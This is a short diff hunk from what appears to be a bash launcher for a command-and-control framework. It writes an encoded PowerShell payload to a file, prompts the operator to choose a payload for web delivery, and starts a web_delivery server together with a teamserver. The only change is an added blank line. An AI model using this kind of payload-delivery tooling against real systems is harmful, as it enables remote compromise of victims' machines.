@@ -41,3 +41,4 @@ echo "powershell -e $ENCODED_PAYLOAD" > src/p1/b
 read -p "Please slect payload for web delivery(Press 'a' for default powershell payload and 'b' for encoded powershell payload): " payload
 payload=src/p1/$payload 
 bash -c "./src/teamserver/web_delivery/exec/web_delivery $Host $PORT $payload & exec ./src/teamserver/exec/teamserver_2 $Host $Port"
+
